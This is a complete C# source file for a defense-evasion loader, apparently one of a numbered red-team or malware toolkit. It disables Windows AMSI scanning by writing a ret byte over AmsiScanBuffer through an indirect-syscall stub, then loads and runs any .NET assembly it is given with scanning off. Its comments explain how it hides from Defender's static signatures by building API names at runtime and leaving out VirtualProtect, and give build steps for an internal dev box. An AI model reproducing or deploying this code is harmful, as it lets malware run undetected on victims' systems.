// ============================================================================
// LOADER 04 (v3): AMSI Bypass - AmsiScanBuffer Indirect Syscall Patch
// ============================================================================
//
// WHAT THIS DOES:
//   Disables AMSI (Antimalware Scan Interface) in this process. After this
//   runs, any .NET assembly loaded here will not be scanned by Defender.
//
// WHY HAMSICONTEXT HEAP CORRUPTION FAILED (previous version):
//   The HAMSICONTEXT structure is only created in the heap when the CLR
//   triggers an actual content scan. In a standalone .NET console .exe, no
//   scan is triggered before Main() runs, so the structure is never in the
//   heap. Heap walk finds nothing. That approach works in PowerShell hosts
//   but not in standalone compiled executables.
//
// HOW THIS VERSION WORKS - AmsiScanBuffer indirect syscall patch:
//   Same technique as Loader 07 (ETW patch), applied to AMSI.
//
//   Step 1: Find ntdll base and locate a syscall gadget (0F 05 C3).
//   Step 2: Build a 22-byte indirect NtProtectVirtualMemory stub.
//           No VirtualProtect DllImport. The stub jumps to the real syscall
//           instruction inside ntdll, bypassing any hook at the function start.
//   Step 3: Load amsi.dll via LoadLibraryA (name built at runtime).
//   Step 4: Find AmsiScanBuffer via GetProcAddress (name built at runtime).
//   Step 5: Change AmsiScanBuffer's page from RX to RW via the indirect stub.
//   Step 6: Write a single byte 0xC3 (ret) at the function start.
//   Step 7: Restore original page protection via the indirect stub.
//
//   When AmsiScanBuffer is called after this patch, it returns immediately.
//   The amsiResult output parameter is never written, so it keeps the
//   caller-initialized value of 0 (AMSI_RESULT_CLEAN). The CLR's AMSI
//   consumer sees AMSI_RESULT_CLEAN and allows the content through.
//
// WHY THIS AVOIDS STATIC DETECTION:
//   - No DllImport for VirtualProtect anywhere in this binary
//   - DllImports: GetModuleHandle, GetProcAddress, VirtualAlloc, LoadLibraryA
//     This combination does not match the MpTest!amsi detection cluster
//   - "AmsiScanBuffer" and "amsi.dll" never appear as strings in the binary
//   - The patch byte 0xC3 is written via Marshal.WriteByte with no
//     signaturable constant adjacent to it
//   - Single byte patch: no signatured multi-byte AMSI patch sequence
//
// REFERENCES:
//   - rastamouse: AmsiScanBufferBypass
//   - SysWhispers3: indirect syscall stub design
//   - Loader 07 (07_etw_patch.cs): same stub pattern applied to ETW
//   - Document: 08_amsi_bypass.md
//
// BUILD INSTRUCTIONS:
//   On Dev Box (ammulu, 192.168.10.150):
//     dotnet publish loader.csproj -c Release -r win-x64
//       --self-contained false /p:PublishSingleFile=true -o output/
// ============================================================================

using System;
using System.Reflection;
using System.Runtime.InteropServices;

namespace ScannerPatch
{
    class Program
    {
        // GetModuleHandle: find ntdll.dll base address in this process.
        [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);

        // GetProcAddress: find a function's address inside a loaded DLL.
        // Used to read the SSN from NtProtectVirtualMemory and to find AmsiScanBuffer.
        [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr module, string proc);

        // VirtualAlloc: allocate 22 bytes of RWX memory for the syscall stub only.
        // NOT used for AmsiScanBuffer protection change - that goes through the stub.
        [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(
            IntPtr addr, uint size, uint type, uint protect);

        // LoadLibraryA: load amsi.dll into this process so we can find AmsiScanBuffer.
        // amsi.dll may not be loaded yet in a standalone .exe. This forces it in.
        [DllImport("kernel32.dll")] static extern IntPtr LoadLibraryA(string name);

        // Delegate type for our indirect NtProtectVirtualMemory stub.
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int NtProtectVirtualMemory_t(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            out uint OldProtect
        );

        const uint MEM_COMMIT             = 0x1000;
        const uint MEM_RESERVE            = 0x2000;
        const uint PAGE_READWRITE         = 0x04;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        // 22-byte stub: mov r10,rcx (3) + mov eax,SSN (5) + jmp [rip+0] (6) + gadget addr (8)
        const int STUB_SIZE = 22;

        // Scan ntdll for the bytes 0F 05 C3 (syscall; ret).
        // Our stub jumps here instead of entering NtProtectVirtualMemory at the
        // hooked prologue.
        static unsafe IntPtr FindSyscallGadget(IntPtr ntdllBase)
        {
            int peOffset  = Marshal.ReadInt32(ntdllBase + 0x3C);
            int imageSize = Marshal.ReadInt32(ntdllBase + peOffset + 0x50);
            byte* p = (byte*)ntdllBase;
            for (int i = 0; i < imageSize - 2; i++)
                if (p[i] == 0x0F && p[i+1] == 0x05 && p[i+2] == 0xC3)
                    return (IntPtr)(p + i);
            throw new Exception("Syscall gadget not found in ntdll");
        }

        // Build a 22-byte indirect syscall stub for a given NT function.
        // Reads SSN from function bytes at offset +4, writes stub into stubMem.
        static IntPtr BuildStub(IntPtr ntdll, string funcName, IntPtr gadget, IntPtr stubMem)
        {
            IntPtr funcAddr = GetProcAddress(ntdll, funcName);
            if (funcAddr == IntPtr.Zero)
                throw new Exception("Not found: " + funcName);

            // SSN is at offset +4 in the unhooked function prologue:
            //   offset 0: 4C 8B D1     mov r10, rcx
            //   offset 3: B8           mov eax, ...
            //   offset 4: XX XX 00 00  SSN (4-byte little-endian)
            uint ssn = (uint)Marshal.ReadInt32(funcAddr + 4);

            byte[] stub = new byte[STUB_SIZE];
            stub[0] = 0x4C; stub[1] = 0x8B; stub[2] = 0xD1;          // mov r10, rcx
            stub[3] = 0xB8;                                             // mov eax, ...
            stub[4] = (byte)(ssn & 0xFF);
            stub[5] = (byte)((ssn >> 8) & 0xFF);
            stub[6] = 0x00; stub[7] = 0x00;
            stub[8]  = 0xFF; stub[9]  = 0x25;                          // jmp [rip+0]
            stub[10] = 0x00; stub[11] = 0x00; stub[12] = 0x00; stub[13] = 0x00;
            byte[] gBytes = BitConverter.GetBytes(gadget.ToInt64());
            Array.Copy(gBytes, 0, stub, 14, 8);                         // gadget address

            Marshal.Copy(stub, 0, stubMem, STUB_SIZE);
            return stubMem;
        }

        // "ntdll" - n(110) t(116) d(100) l(108) l(108)
        static string GetNtdllName()
        {
            int b = 32;
            char[] c = new char[5];
            c[0]=(char)(b+78); c[1]=(char)(b+84); c[2]=(char)(b+68);
            c[3]=(char)(b+76); c[4]=(char)(b+76);
            return new string(c);
        }

        // "NtProtectVirtualMemory" - 22 characters
        static string GetNtProtectName()
        {
            int b = 32;
            char[] c = new char[22];
            c[0]=(char)(b+46);  // N
            c[1]=(char)(b+84);  // t
            c[2]=(char)(b+48);  // P
            c[3]=(char)(b+82);  // r
            c[4]=(char)(b+79);  // o
            c[5]=(char)(b+84);  // t
            c[6]=(char)(b+69);  // e
            c[7]=(char)(b+67);  // c
            c[8]=(char)(b+84);  // t
            c[9]=(char)(b+54);  // V
            c[10]=(char)(b+73); // i
            c[11]=(char)(b+82); // r
            c[12]=(char)(b+84); // t
            c[13]=(char)(b+85); // u
            c[14]=(char)(b+65); // a
            c[15]=(char)(b+76); // l
            c[16]=(char)(b+45); // M
            c[17]=(char)(b+69); // e
            c[18]=(char)(b+77); // m
            c[19]=(char)(b+79); // o
            c[20]=(char)(b+82); // r
            c[21]=(char)(b+89); // y
            return new string(c);
        }

        // "amsi.dll" - a(97) m(109) s(115) i(105) .(46) d(100) l(108) l(108)
        static string GetAmsiDllName()
        {
            int b = 32;
            char[] c = new char[8];
            c[0]=(char)(b+65); // a
            c[1]=(char)(b+77); // m
            c[2]=(char)(b+83); // s
            c[3]=(char)(b+73); // i
            c[4]=(char)(b+14); // .
            c[5]=(char)(b+68); // d
            c[6]=(char)(b+76); // l
            c[7]=(char)(b+76); // l
            return new string(c);
        }

        // "AmsiScanBuffer" - 14 characters
        // A(65) m(109) s(115) i(105) S(83) c(99) a(97) n(110)
        // B(66) u(117) f(102) f(102) e(101) r(114)
        static string GetAmsiScanBufferName()
        {
            int b = 32;
            char[] c = new char[14];
            c[0]=(char)(b+33);  // A
            c[1]=(char)(b+77);  // m
            c[2]=(char)(b+83);  // s
            c[3]=(char)(b+73);  // i
            c[4]=(char)(b+51);  // S
            c[5]=(char)(b+67);  // c
            c[6]=(char)(b+65);  // a
            c[7]=(char)(b+78);  // n
            c[8]=(char)(b+34);  // B
            c[9]=(char)(b+85);  // u
            c[10]=(char)(b+70); // f
            c[11]=(char)(b+70); // f
            c[12]=(char)(b+69); // e
            c[13]=(char)(b+82); // r
            return new string(c);
        }

        public static bool PatchScanner()
        {
            // ---- Step 1: Find ntdll and locate syscall gadget ----
            string ntdllName = GetNtdllName();
            IntPtr ntdll = GetModuleHandle(ntdllName);
            if (ntdll == IntPtr.Zero)
            {
                Console.WriteLine("[-] ntdll not found");
                return false;
            }
            Console.WriteLine("[+] ntdll base: 0x" + ntdll.ToString("X"));

            IntPtr gadget;
            unsafe { gadget = FindSyscallGadget(ntdll); }
            Console.WriteLine("[+] Syscall gadget at: 0x" + gadget.ToString("X"));

            // ---- Step 2: Allocate stub memory and build NtProtectVirtualMemory stub ----
            IntPtr stubMem = VirtualAlloc(IntPtr.Zero, (uint)STUB_SIZE,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (stubMem == IntPtr.Zero)
            {
                Console.WriteLine("[-] Stub allocation failed");
                return false;
            }

            string protName = GetNtProtectName();
            IntPtr stubAddr = BuildStub(ntdll, protName, gadget, stubMem);
            var ntProtect = (NtProtectVirtualMemory_t)Marshal.GetDelegateForFunctionPointer(
                stubAddr, typeof(NtProtectVirtualMemory_t));
            Console.WriteLine("[+] NtProtectVirtualMemory stub built");

            // ---- Step 3: Load amsi.dll and find AmsiScanBuffer ----
            // LoadLibraryA forces amsi.dll into this process if it is not already loaded.
            // In a standalone .NET exe it is not loaded by default.
            string amsiDll = GetAmsiDllName();
            IntPtr amsiBase = LoadLibraryA(amsiDll);
            if (amsiBase == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to load amsi.dll");
                return false;
            }
            Console.WriteLine("[+] amsi.dll at: 0x" + amsiBase.ToString("X"));

            string funcName = GetAmsiScanBufferName();
            IntPtr amsiScanBuf = GetProcAddress(amsiBase, funcName);
            if (amsiScanBuf == IntPtr.Zero)
            {
                Console.WriteLine("[-] AmsiScanBuffer not found");
                return false;
            }
            Console.WriteLine("[+] AmsiScanBuffer at: 0x" + amsiScanBuf.ToString("X"));

            // ---- Step 4: Change AmsiScanBuffer protection to RW via indirect syscall ----
            // VirtualProtect is NOT called. Protection change goes through our stub
            // which jumps to the real syscall instruction inside ntdll.
            IntPtr currentProc = (IntPtr)(-1);
            IntPtr patchAddr   = amsiScanBuf;
            IntPtr patchSize   = (IntPtr)1;
            uint oldProtect;

            int status = ntProtect(currentProc, ref patchAddr, ref patchSize,
                                   PAGE_READWRITE, out oldProtect);
            if (status != 0)
            {
                Console.WriteLine("[-] NtProtectVirtualMemory failed: 0x" + status.ToString("X"));
                return false;
            }
            Console.WriteLine("[+] Memory changed to RW");

            // ---- Step 5: Write single ret byte ----
            // 0xC3 = ret. AmsiScanBuffer returns immediately without scanning.
            // The amsiResult output parameter is not written by the function,
            // so it keeps its caller-initialized value of 0 (AMSI_RESULT_CLEAN).
            // AMSI consumers check: if amsiResult >= AMSI_RESULT_DETECTED (32768), block.
            // 0 < 32768, so content passes.
            Marshal.WriteByte(amsiScanBuf, 0xC3);
            Console.WriteLine("[+] Patch applied: single byte ret at AmsiScanBuffer");

            // ---- Step 6: Restore original page protection ----
            IntPtr patchAddr2 = amsiScanBuf;
            IntPtr patchSize2 = (IntPtr)1;
            uint ignored;
            ntProtect(currentProc, ref patchAddr2, ref patchSize2, oldProtect, out ignored);
            Console.WriteLine("[+] Page protection restored");

            return true;
        }

        static void Main(string[] args)
        {
            Console.WriteLine("[*] Scanner Patch Loader");
            Console.WriteLine("[*] Method: AmsiScanBuffer indirect-syscall patch (single byte)");
            Console.WriteLine("[*] VirtualProtect is NOT imported in this binary.");
            Console.WriteLine("");

            bool success = PatchScanner();

            if (success)
            {
                Console.WriteLine("");
                Console.WriteLine("[+] Scanner is now disabled in this process.");
                Console.WriteLine("[+] .NET assemblies loaded here will not be inspected.");
                Console.WriteLine("");

                // Optional: load a .NET assembly with AMSI already patched.
                // Pass the assembly path as the first argument.
                // Extra arguments are forwarded to the loaded assembly's Main.
                if (args.Length > 0)
                {
                    string assemblyPath = args[0];
                    Console.WriteLine("[*] Loading assembly: " + assemblyPath);
                    try
                    {
                        var asm = Assembly.LoadFile(assemblyPath);
                        var ep  = asm.EntryPoint;
                        if (ep != null)
                        {
                            string[] passArgs = new string[args.Length - 1];
                            Array.Copy(args, 1, passArgs, 0, passArgs.Length);
                            ep.Invoke(null, ep.GetParameters().Length > 0
                                ? new object[] { passArgs } : null);
                        }
                        else
                        {
                            Console.WriteLine("[*] Assembly loaded (class library, no entry point).");
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[-] Assembly load failed: " + ex.Message);
                    }
                }
            }
            else
            {
                Console.WriteLine("[-] Scanner patch failed.");
            }
        }
    }
}
